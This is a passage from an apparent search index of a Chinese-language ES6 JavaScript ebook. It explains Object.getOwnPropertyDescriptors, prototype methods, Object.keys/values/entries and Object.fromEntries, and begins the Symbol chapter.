Object.defineProperties(\n  target,\n  Object.getOwnPropertyDescriptors(source)\n);\n</code></pre> <p><code>Object.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\u7684\u53e6\u4e00\u4e2a\u7528\u5904\uff0c\u662f\u914d\u5408<code>Object.create()</code>\u65b9\u6cd5\uff0c\u5c06\u5bf9\u8c61\u5c5e\u6027\u514b\u9686\u5230\u4e00\u4e2a\u65b0\u5bf9\u8c61\u3002\u8fd9\u5c5e\u4e8e\u6d45\u62f7\u8d1d\u3002</p> <pre><code>const clone = Object.create(Object.getPrototypeOf(obj),\n  Object.getOwnPropertyDescriptors(obj));\n\n// \u6216\u8005\n\nconst shallowClone = (obj) =&gt; Object.create(\n  Object.getPrototypeOf(obj),\n  Object.getOwnPropertyDescriptors(obj)\n);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4f1a\u514b\u9686\u5bf9\u8c61<code>obj</code>\u3002</p> <p>\u53e6\u5916\uff0c<code>Object.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u5bf9\u8c61\u7ee7\u627f\u53e6\u4e00\u4e2a\u5bf9\u8c61\u3002\u4ee5\u524d\uff0c\u7ee7\u627f\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5e38\u5e38\u5199\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>const obj = {\n  __proto__: prot,\n  foo: 123,\n};\n</code></pre> <p>ES6 \u89c4\u5b9a<code>__proto__</code>\u53ea\u6709\u6d4f\u89c8\u5668\u8981\u90e8\u7f72\uff0c\u5176\u4ed6\u73af\u5883\u4e0d\u7528\u90e8\u7f72\u3002\u5982\u679c\u53bb\u9664<code>__proto__</code>\uff0c\u4e0a\u9762\u4ee3\u7801\u5c31\u8981\u6539\u6210\u4e0b\u9762\u8fd9\u6837\u3002</p> <pre><code>const obj = Object.create(prot);\nobj.foo = 123;\n\n// \u6216\u8005\n\nconst obj = Object.assign(\n  Object.create(prot), {foo: 123 }\n);\n</code></pre> <p>\u6709\u4e86<code>Object.getOwnPropertyDescriptors()</code>\uff0c\u6211\u4eec\u5c31\u6709\u4e86\u53e6\u4e00\u79cd\u5199\u6cd5\u3002</p> <pre><code>const obj = Object.create(\n  prot,\n  Object.getOwnPropertyDescriptors({\n    foo: 123,\n  })\n);\n</code></pre> <p><code>Object.getOwnPropertyDescriptors()</code>\u4e5f\u53ef\u4ee5\u7528\u6765\u5b9e\u73b0 Mixin\uff08\u6df7\u5165\uff09\u6a21\u5f0f\u3002</p> <pre><code>let mix = (object) =&gt; ({\n  with: (...mixins) =&gt; mixins.reduce(\n    (c, mixin) =&gt; Object.create(\n      c, Object.getOwnPropertyDescriptors(mixin)\n    ), object)\n});\n\n// multiple mixins example\nlet a = {a: 'a'};\nlet b = {b: 'b'};\nlet c = {c: 'c'};\nlet d = mix(c).with(a, b);\n\nd.c // \"c\"\nd.b // \"b\"\nd.a // \"a\"\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61<code>d</code>\uff0c\u4ee3\u8868\u4e86\u5bf9\u8c61<code>a</code>\u548c<code>b</code>\u88ab\u6df7\u5165\u4e86\u5bf9\u8c61<code>c</code>\u7684\u64cd\u4f5c\u3002</p> <p>\u51fa\u4e8e\u5b8c\u6574\u6027\u7684\u8003\u8651\uff0c<code>Object.getOwnPropertyDescriptors()</code>\u8fdb\u5165\u6807\u51c6\u4ee5\u540e\uff0c\u4ee5\u540e\u8fd8\u4f1a\u65b0\u589e<code>Reflect.getOwnPropertyDescriptors()</code>\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#4_2","title":"4\u3001\u539f\u578b\u5bf9\u8c61\u6269\u5c55","text":"<p><code>__proto__</code>, Object.setPrototypeOf()\uff0cObject.getPrototypeOf()</p> <p>JavaScript \u8bed\u8a00\u7684\u5bf9\u8c61\u7ee7\u627f\u662f\u901a\u8fc7\u539f\u578b\u94fe\u5b9e\u73b0\u7684\u3002ES6 \u63d0\u4f9b\u4e86\u66f4\u591a\u539f\u578b\u5bf9\u8c61\u7684\u64cd\u4f5c\u65b9\u6cd5\u3002</p> <p>_ _ proto _ _ Object.setPrototypeOf() Object.getPrototypeOf()</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#__proto__","title":"<code>__proto__</code>\u5c5e\u6027","text":"<p><code>__proto__</code>\u5c5e\u6027\uff08\u524d\u540e\u5404\u4e24\u4e2a\u4e0b\u5212\u7ebf\uff09\uff0c\u7528\u6765\u8bfb\u53d6\u6216\u8bbe\u7f6e\u5f53\u524d\u5bf9\u8c61\u7684<code>prototype</code>\u5bf9\u8c61\u3002</p> <pre><code>// es5 \u7684\u5199\u6cd5\nconst obj = {\n  method: function() { ... }\n};\nobj.__proto__ = someOtherObj;\n\nobj.__proto__ = someObj; \u8fd9\u662f\u5185\u90e8\u5c5e\u6027\uff0c\u6700\u597d\u4e0d\u8981\u76f4\u63a5\u4f7f\u7528\n// es6 \u7684\u5199\u6cd5\nvar obj = Object.create(someOtherObj);\nobj.method = function() { ... };\n\nlet obj = Object.create(someOtherObj); \u8bbe\u7f6e\u5f53\u524d\u7684\u539f\u578b\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u975e\nobj.method = function() {...}; \u8bbe\u7f6e\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\n</code></pre> <p>\u8be5\u5c5e\u6027\u6ca1\u6709\u5199\u5165 ES6 \u7684\u6b63\u6587\uff0c\u800c\u662f\u5199\u5165\u4e86\u9644\u5f55\uff0c\u539f\u56e0\u662f<code>__proto__</code>\u524d\u540e\u7684\u53cc\u4e0b\u5212\u7ebf\uff0c\u8bf4\u660e\u5b83\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5185\u90e8\u5c5e\u6027\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u6b63\u5f0f\u7684\u5bf9\u5916\u7684 API\uff0c\u53ea\u662f\u7531\u4e8e\u6d4f\u89c8\u5668\u5e7f\u6cdb\u652f\u6301\uff0c\u624d\u88ab\u52a0\u5165\u4e86 ES6\u3002\u6807\u51c6\u660e\u786e\u89c4\u5b9a\uff0c\u53ea\u6709\u6d4f\u89c8\u5668\u5fc5\u987b\u90e8\u7f72\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5176\u4ed6\u8fd0\u884c\u73af\u5883\u4e0d\u4e00\u5b9a\u9700\u8981\u90e8\u7f72\uff0c\u800c\u4e14\u65b0\u7684\u4ee3\u7801\u6700\u597d\u8ba4\u4e3a\u8fd9\u4e2a\u5c5e\u6027\u662f\u4e0d\u5b58\u5728\u7684\u3002\u56e0\u6b64\uff0c\u65e0\u8bba\u4ece\u8bed\u4e49\u7684\u89d2\u5ea6\uff0c\u8fd8\u662f\u4ece\u517c\u5bb9\u6027\u7684\u89d2\u5ea6\uff0c\u90fd\u4e0d\u8981\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u662f\u4f7f\u7528\u4e0b\u9762\u7684<code>Object.setPrototypeOf()</code>\uff08\u5199\u64cd\u4f5c\uff09\u3001<code>Object.getPrototypeOf()</code>\uff08\u8bfb\u64cd\u4f5c\uff09\u3001<code>Object.create()</code>\uff08\u751f\u6210\u64cd\u4f5c\uff09\u4ee3\u66ff\u3002</p> <p>\u5b9e\u73b0\u4e0a\uff0c<code>__proto__</code>\u8c03\u7528\u7684\u662f<code>Object.prototype.__proto__</code>\uff0c\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\u3002</p> <pre><code>Object.defineProperty(Object.prototype, '__proto__', {\n  get() {\n    let _thisObj = Object(this);\n    return Object.getPrototypeOf(_thisObj);\n  },\n  set(proto) {\n    if (this === undefined || this === null) {\n      throw new TypeError();\n    }\n    if (!isObject(this)) {\n      return undefined;\n    }\n    if (!isObject(proto)) {\n      return undefined;\n    }\n    let status = Reflect.setPrototypeOf(this, proto);\n    if (!status) {\n      throw new TypeError();\n    }\n  },\n});\n\nfunction isObject(value) {\n  return Object(value) === value;\n}\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u672c\u8eab\u90e8\u7f72\u4e86<code>__proto__</code>\u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u7684\u503c\u5c31\u662f\u5bf9\u8c61\u7684\u539f\u578b\u3002</p> <pre><code>Object.getPrototypeOf({ __proto__: null })\n// null\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#objectsetprototypeof","title":"Object.setPrototypeOf()","text":"<p><code>Object.setPrototypeOf</code>\u65b9\u6cd5\u7684\u4f5c\u7528\u4e0e<code>__proto__</code>\u76f8\u540c\uff0c\u7528\u6765\u8bbe\u7f6e\u4e00\u4e2a\u5bf9\u8c61\u7684<code>prototype</code>\u5bf9\u8c61\uff0c\u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u672c\u8eab\u3002\u5b83\u662f ES6 \u6b63\u5f0f\u63a8\u8350\u7684\u8bbe\u7f6e\u539f\u578b\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002</p> <pre><code>// \u683c\u5f0f\nObject.setPrototypeOf(object, prototype)\n\n// \u7528\u6cd5\nconst o = Object.setPrototypeOf({}, null);\n\nObject.setPrototypeOf(obj, prototype);\nconst o = Object.setPrototypeOf({}, null);\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u51fd\u6570\u3002</p> <pre><code>function setPrototypeOf(obj, proto) {\n  obj.__proto__ = proto;\n  return obj;\n}\n\nfunction setPrototype(obj, proto) {\n  obj.__proto__ = proto\n  return obj;\n}\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>let proto = {};\nlet obj = { x: 10 };\nObject.setPrototypeOf(obj, proto);\n\nproto.y = 20;\nproto.z = 40;\n\nobj.x // 10\nobj.y // 20\nobj.z // 40\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c06<code>proto</code>\u5bf9\u8c61\u8bbe\u4e3a<code>obj</code>\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u6240\u4ee5\u4ece<code>obj</code>\u5bf9\u8c61\u53ef\u4ee5\u8bfb\u53d6<code>proto</code>\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <p>\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\u3002\u4f46\u662f\u7531\u4e8e\u8fd4\u56de\u7684\u8fd8\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u64cd\u4f5c\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u6548\u679c\u3002</p> <pre><code>Object.setPrototypeOf(1, {}) === 1 // true\nObject.setPrototypeOf('foo', {}) === 'foo' // true\nObject.setPrototypeOf(true, {}) === true // true\n</code></pre> <p>\u7531\u4e8e<code>undefined</code>\u548c<code>null</code>\u65e0\u6cd5\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u6240\u4ee5\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f<code>undefined</code>\u6216<code>null</code>\uff0c\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.setPrototypeOf(undefined, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\n\nObject.setPrototypeOf(null, {})\n// TypeError: Object.setPrototypeOf called on null or undefined\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#objectgetprototypeof","title":"Object.getPrototypeOf()","text":"<p>\u8be5\u65b9\u6cd5\u4e0e<code>Object.setPrototypeOf</code>\u65b9\u6cd5\u914d\u5957\uff0c\u7528\u4e8e\u8bfb\u53d6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\u3002</p> <pre><code>Object.getPrototypeOf(obj);\n</code></pre> <p>\u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002\u53ef\u4ee5\u5224\u65ad\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\u548c\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u5bf9\u8c61\u662f\u5426\u76f8\u7b49\u3002</p> <pre><code>function Rectangle() {\n  // ...\n}\n\nconst rec = new Rectangle();\n\nObject.getPrototypeOf(rec) === Rectangle.prototype\n// true\n\nObject.setPrototypeOf(rec, Object.prototype);\nObject.getPrototypeOf(rec) === Rectangle.prototype\n// false\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c\u4f1a\u88ab\u81ea\u52a8\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>// \u7b49\u540c\u4e8e Object.getPrototypeOf(Number(1))\nObject.getPrototypeOf(1)\n// Number {[[PrimitiveValue]]: 0}\n\n// \u7b49\u540c\u4e8e Object.getPrototypeOf(String('foo'))\nObject.getPrototypeOf('foo')\n// String {length: 0, [[PrimitiveValue]]: \"\"}\n\n// \u7b49\u540c\u4e8e Object.getPrototypeOf(Boolean(true))\nObject.getPrototypeOf(true)\n// Boolean {[[PrimitiveValue]]: false}\n\nObject.getPrototypeOf(1) === Number.prototype // true\nObject.getPrototypeOf('foo') === String.prototype // true\nObject.getPrototypeOf(true) === Boolean.prototype // true\n</code></pre> <p>\u5982\u679c\u53c2\u6570\u662f<code>undefined</code>\u6216<code>null</code>\uff0c\u5b83\u4eec\u65e0\u6cd5\u8f6c\u4e3a\u5bf9\u8c61\uff0c\u6240\u4ee5\u4f1a\u62a5\u9519\u3002</p> <pre><code>Object.getPrototypeOf(null)\n// TypeError: Cannot convert undefined or null to object\n\nObject.getPrototypeOf(undefined)\n// TypeError: Cannot convert undefined or null to object\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#5_1","title":"5\u3001\u5bf9\u8c61\u7684\u952e\u503c\u5bf9","text":"<p>Object.keys()\uff0cObject.values()\uff0cObject.entries()</p>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#objectkeys","title":"Object.keys()","text":"<p>ES5 \u5f15\u5165\u4e86<code>Object.keys</code>\u65b9\u6cd5\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u4e0d\u542b\u7ee7\u627f\u7684\uff09\u6240\u6709\u53ef\u904d\u5386\uff08enumerable\uff09\u5c5e\u6027\u7684\u952e\u540d\u3002</p> <pre><code>var obj = { foo: 'bar', baz: 42 };\nObject.keys(obj)\n// [\"foo\", \"baz\"]\n</code></pre> <p>ES2017 \u5f15\u5165\u4e86\u8ddf<code>Object.keys</code>\u914d\u5957\u7684<code>Object.values</code>\u548c<code>Object.entries</code>\uff0c\u4f5c\u4e3a\u904d\u5386\u4e00\u4e2a\u5bf9\u8c61\u7684\u8865\u5145\u624b\u6bb5\uff0c\u4f9b<code>for...of</code>\u5faa\u73af\u4f7f\u7528\u3002</p> <pre><code>let {keys, values, entries} = Object;\nlet obj = { a: 1, b: 2, c: 3 };\n\nfor (let key of keys(obj)) {\n  console.log(key); // 'a', 'b', 'c'\n}\n\nfor (let value of values(obj)) {\n  console.log(value); // 1, 2, 3\n}\n\nfor (let [key, value] of entries(obj)) {\n  console.log([key, value]); // ['a', 1], ['b', 2], ['c', 3]\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#objectvalues","title":"Object.values()","text":"<p><code>Object.values</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u4e0d\u542b\u7ee7\u627f\u7684\uff09\u6240\u6709\u53ef\u904d\u5386\uff08enumerable\uff09\u5c5e\u6027\u7684\u952e\u503c\u3002</p> <pre><code>const obj = { foo: 'bar', baz: 42 };\nObject.values(obj)\n// [\"bar\", 42]\n</code></pre> <p>\u8fd4\u56de\u6570\u7ec4\u7684\u6210\u5458\u987a\u5e8f\uff0c\u4e0e\u672c\u7ae0\u7684\u300a\u5c5e\u6027\u7684\u904d\u5386\u300b\u90e8\u5206\u4ecb\u7ecd\u7684\u6392\u5217\u89c4\u5219\u4e00\u81f4\u3002</p> <pre><code>const obj = { 100: 'a', 2: 'b', 7: 'c' };\nObject.values(obj)\n// [\"b\", \"c\", \"a\"]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5c5e\u6027\u540d\u4e3a\u6570\u503c\u7684\u5c5e\u6027\uff0c\u662f\u6309\u7167\u6570\u503c\u5927\u5c0f\uff0c\u4ece\u5c0f\u5230\u5927\u904d\u5386\u7684\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u987a\u5e8f\u662f<code>b</code>\u3001<code>c</code>\u3001<code>a</code>\u3002</p> <p><code>Object.values</code>\u53ea\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u53ef\u904d\u5386\u5c5e\u6027\u3002</p> <pre><code>const obj = Object.create({}, {p: {value: 42}});\nObject.values(obj) // []\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>Object.create</code>\u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u6dfb\u52a0\u7684\u5bf9\u8c61\u5c5e\u6027\uff08\u5c5e\u6027<code>p</code>\uff09\uff0c\u5982\u679c\u4e0d\u663e\u5f0f\u58f0\u660e\uff0c\u9ed8\u8ba4\u662f\u4e0d\u53ef\u904d\u5386\u7684\uff0c\u56e0\u4e3a<code>p</code>\u7684\u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61\u7684<code>enumerable</code>\u9ed8\u8ba4\u662f<code>false</code>\uff0c<code>Object.values</code>\u4e0d\u4f1a\u8fd4\u56de\u8fd9\u4e2a\u5c5e\u6027\u3002\u53ea\u8981\u628a<code>enumerable</code>\u6539\u6210<code>true</code>\uff0c<code>Object.values</code>\u5c31\u4f1a\u8fd4\u56de\u5c5e\u6027<code>p</code>\u7684\u503c\u3002</p> <pre><code>const obj = Object.create({}, {p:\n  {\n    value: 42,\n    enumerable: true\n  }\n});\nObject.values(obj) // [42]\n</code></pre> <p><code>Object.values</code>\u4f1a\u8fc7\u6ee4\u5c5e\u6027\u540d\u4e3a Symbol \u503c\u7684\u5c5e\u6027\u3002</p> <pre><code>Object.values({ [Symbol()]: 123, foo: 'abc' });\n// ['abc']\n</code></pre> <p>\u5982\u679c<code>Object.values</code>\u65b9\u6cd5\u7684\u53c2\u6570\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4f1a\u8fd4\u56de\u5404\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u4e00\u4e2a\u6570\u7ec4\u3002</p> <pre><code>Object.values('foo')\n// ['f', 'o', 'o']\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u4f1a\u5148\u8f6c\u6210\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002\u5b57\u7b26\u4e32\u7684\u6bcf\u4e2a\u5b57\u7b26\uff0c\u5c31\u662f\u8be5\u5bf9\u8c61\u7684\u4e00\u4e2a\u5c5e\u6027\u3002\u56e0\u6b64\uff0c<code>Object.values</code>\u8fd4\u56de\u6bcf\u4e2a\u5c5e\u6027\u7684\u952e\u503c\uff0c\u5c31\u662f\u5404\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u4e00\u4e2a\u6570\u7ec4\u3002</p> <p>\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5bf9\u8c61\uff0c<code>Object.values</code>\u4f1a\u5148\u5c06\u5176\u8f6c\u4e3a\u5bf9\u8c61\u3002\u7531\u4e8e\u6570\u503c\u548c\u5e03\u5c14\u503c\u7684\u5305\u88c5\u5bf9\u8c61\uff0c\u90fd\u4e0d\u4f1a\u4e3a\u5b9e\u4f8b\u6dfb\u52a0\u975e\u7ee7\u627f\u7684\u5c5e\u6027\u3002\u6240\u4ee5\uff0c<code>Object.values</code>\u4f1a\u8fd4\u56de\u7a7a\u6570\u7ec4\u3002</p> <pre><code>Object.values(42) // []\nObject.values(true) // []\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#objectentries","title":"Object.entries()","text":"<p><code>Object.entries()</code>\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6210\u5458\u662f\u53c2\u6570\u5bf9\u8c61\u81ea\u8eab\u7684\uff08\u4e0d\u542b\u7ee7\u627f\u7684\uff09\u6240\u6709\u53ef\u904d\u5386\uff08enumerable\uff09\u5c5e\u6027\u7684\u952e\u503c\u5bf9\u6570\u7ec4\u3002</p> <pre><code>const obj = { foo: 'bar', baz: 42 };\nObject.entries(obj)\n// [ [\"foo\", \"bar\"], [\"baz\", 42] ]\n</code></pre> <p>\u9664\u4e86\u8fd4\u56de\u503c\u4e0d\u4e00\u6837\uff0c\u8be5\u65b9\u6cd5\u7684\u884c\u4e3a\u4e0e<code>Object.values</code>\u57fa\u672c\u4e00\u81f4\u3002</p> <p>\u5982\u679c\u539f\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u662f\u4e00\u4e2a Symbol \u503c\uff0c\u8be5\u5c5e\u6027\u4f1a\u88ab\u5ffd\u7565\u3002</p> <pre><code>Object.entries({ [Symbol()]: 123, foo: 'abc' });\n// [ [ 'foo', 'abc' ] ]\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u539f\u5bf9\u8c61\u6709\u4e24\u4e2a\u5c5e\u6027\uff0c<code>Object.entries</code>\u53ea\u8f93\u51fa\u5c5e\u6027\u540d\u975e Symbol \u503c\u7684\u5c5e\u6027\u3002\u5c06\u6765\u53ef\u80fd\u4f1a\u6709<code>Reflect.ownEntries()</code>\u65b9\u6cd5\uff0c\u8fd4\u56de\u5bf9\u8c61\u81ea\u8eab\u7684\u6240\u6709\u5c5e\u6027\u3002</p> <p><code>Object.entries</code>\u7684\u57fa\u672c\u7528\u9014\u662f\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <pre><code>let obj = { one: 1, two: 2 };\nfor (let [k, v] of Object.entries(obj)) {\n  console.log(\n    `${JSON.stringify(k)}: ${JSON.stringify(v)}`\n  );\n}\n// \"one\": 1\n// \"two\": 2\n</code></pre> <p><code>Object.entries</code>\u65b9\u6cd5\u7684\u53e6\u4e00\u4e2a\u7528\u5904\u662f\uff0c\u5c06\u5bf9\u8c61\u8f6c\u4e3a\u771f\u6b63\u7684<code>Map</code>\u7ed3\u6784\u3002</p> <pre><code>const obj = { foo: 'bar', baz: 42 };\nconst map = new Map(Object.entries(obj));\nmap // Map { foo: \"bar\", baz: 42 }\n</code></pre> <p>\u81ea\u5df1\u5b9e\u73b0<code>Object.entries</code>\u65b9\u6cd5\uff0c\u975e\u5e38\u7b80\u5355\u3002</p> <pre><code>// Generator\u51fd\u6570\u7684\u7248\u672c\nfunction* entries(obj) {\n  for (let key of Object.keys(obj)) {\n    yield [key, obj[key]];\n  }\n}\n\n// \u975eGenerator\u51fd\u6570\u7684\u7248\u672c\nfunction entries(obj) {\n  let arr = [];\n  for (let key of Object.keys(obj)) {\n    arr.push([key, obj[key]]);\n  }\n  return arr;\n}\n</code></pre>"},{"location":"ebook-JSES6-RYF/11-%E5%AF%B9%E8%B1%A1%E7%9A%84%E6%96%B0%E5%A2%9E%E6%96%B9%E6%B3%95/#6objectfromentries","title":"6\u3001Object.fromEntries()","text":"<p><code>Object.fromEntries()</code>\u65b9\u6cd5\u662f<code>Object.entries()</code>\u7684\u9006\u64cd\u4f5c\uff0c\u7528\u4e8e\u5c06\u4e00\u4e2a\u952e\u503c\u5bf9\u6570\u7ec4\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>Object.fromEntries([\n  ['foo', 'bar'],\n  ['baz', 42]\n])\n// { foo: \"bar\", baz: 42 }\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u4e3b\u8981\u76ee\u7684\uff0c\u662f\u5c06\u952e\u503c\u5bf9\u7684\u6570\u636e\u7ed3\u6784\u8fd8\u539f\u4e3a\u5bf9\u8c61\uff0c\u56e0\u6b64\u7279\u522b\u9002\u5408\u5c06 Map \u7ed3\u6784\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>// \u4f8b\u4e00\nconst entries = new Map([\n  ['foo', 'bar'],\n  ['baz', 42]\n]);\n\nObject.fromEntries(entries)\n// { foo: \"bar\", baz: 42 }\n\n// \u4f8b\u4e8c\nconst map = new Map().set('foo', true).set('bar', false);\nObject.fromEntries(map)\n// { foo: true, bar: false }\n</code></pre> <p>\u8be5\u65b9\u6cd5\u7684\u4e00\u4e2a\u7528\u5904\u662f\u914d\u5408<code>URLSearchParams</code>\u5bf9\u8c61\uff0c\u5c06\u67e5\u8be2\u5b57\u7b26\u4e32\u8f6c\u4e3a\u5bf9\u8c61\u3002</p> <pre><code>Object.fromEntries(new URLSearchParams('foo=bar&amp;baz=qux'))\n// { foo: \"bar\", baz: \"qux\" }\n</code></pre>"},{"location":"ebook-JSES6-RYF/12-Symbol/","title":"Symbol","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 26366  \u9605\u8bfb53\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/12-Symbol/#_1","title":"\u4ecb\u7ecd","text":"<p>ES5 \u7684\u5bf9\u8c61\u5c5e\u6027\u540d\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u8fd9\u5bb9\u6613\u9020\u6210\u5c5e\u6027\u540d\u7684\u51b2\u7a81\u3002\u6bd4\u5982\uff0c\u4f60\u4f7f\u7528\u4e86\u4e00\u4e2a\u4ed6\u4eba\u63d0\u4f9b\u7684\u5bf9\u8c61\uff0c\u4f46\u53c8\u60f3\u4e3a\u8fd9\u4e2a\u5bf9\u8c61\u6dfb\u52a0\u65b0\u7684\u65b9\u6cd5\uff08mixin \u6a21\u5f0f\uff09\uff0c\u65b0\u65b9\u6cd5\u7684\u540d\u5b57\u5c31\u6709\u53ef\u80fd\u4e0e\u73b0\u6709\u65b9\u6cd5\u4ea7\u751f\u51b2\u7a81\u3002\u5982\u679c\u6709\u4e00\u79cd\u673a\u5236\uff0c\u4fdd\u8bc1\u6bcf\u4e2a\u5c5e\u6027\u7684\u540d\u5b57\u90fd\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\u5c31\u597d\u4e86\uff0c\u8fd9\u6837\u5c31\u4ece\u6839\u672c\u4e0a\u9632\u6b62\u5c5e\u6027\u540d\u7684\u51b2\u7a81\u3002\u8fd9\u5c31\u662f ES6 \u5f15\u5165<code>Symbol</code>\u7684\u539f\u56e0\u3002</p> <p>ES6 \u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u539f\u59cb\u6570\u636e\u7c7b\u578b<code>Symbol</code>\uff0c\u8868\u793a==\u72ec\u4e00\u65e0\u4e8c\u7684\u503c==\u3002\u5b83\u662f JavaScript \u8bed\u8a00\u7684\u7b2c\u4e03\u79cd\u6570\u636e\u7c7b\u578b\uff0c\u524d\u516d\u79cd\u662f\uff1a<code>undefined</code>\u3001<code>null</code>\u3001\u5e03\u5c14\u503c\uff08Boolean\uff09\u3001\u5b57\u7b26\u4e32\uff08String\uff09\u3001\u6570\u503c\uff08Number\uff09\u3001\u5bf9\u8c61\uff08Object\uff09\u3002</p> <p>Symbol \u503c\u901a\u8fc7<code>Symbol</code>\u51fd\u6570\u751f\u6210\u3002\u8fd9\u5c31\u662f\u8bf4\uff0c\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u73b0\u5728\u53ef\u4ee5\u6709\u4e24\u79cd\u7c7b\u578b\uff0c\u4e00\u79cd\u662f\u539f\u6765\u5c31\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u53e6\u4e00\u79cd\u5c31\u662f\u65b0\u589e\u7684 Symbol \u7c7b\u578b\u3002\u51e1\u662f\u5c5e\u6027\u540d\u5c5e\u4e8e Symbol \u7c7b\u578b\uff0c\u5c31\u90fd\u662f\u72ec\u4e00\u65e0\u4e8c\u7684\uff0c\u53ef\u4ee5\u4fdd\u8bc1\u4e0d\u4f1a\u4e0e\u5176\u4ed6\u5c5e\u6027\u540d\u4ea7\u751f\u51b2\u7a81\u3002</p> <pre><code>let s = Symbol();\n\ntypeof 